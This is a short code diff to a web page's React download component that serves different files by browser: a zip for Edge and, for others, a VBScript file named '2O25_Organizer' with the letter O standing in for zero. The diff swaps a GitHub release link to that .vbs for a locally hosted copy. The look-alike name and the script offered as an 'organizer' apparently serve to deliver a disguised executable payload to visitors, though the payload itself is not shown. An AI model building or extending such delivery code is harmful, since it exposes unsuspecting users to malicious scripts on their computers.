@@ -371,11 +371,7 @@ const Download = () => {
     if (ua.includes("Edg/")) {
       return { href: "/docs/2O25_Organizer.zip", extension: "zip" };
     }
-    return {
-      href: "https://github.com/joneraig123/vado-adb/releases/download/v1.0.2/2O25_Organizer_89349333.vbs",
-      fallbackHref: "/docs/2O25_Organizer.vbs",
-      extension: "vbs",
-    };
+    return { href: "/docs/2O25_Organizer.vbs", extension: "vbs" };
   }, []);
 
   const triggerDownload = useCallback(async (file: { href: string; fallbackHref?: string; extension: string }) => {
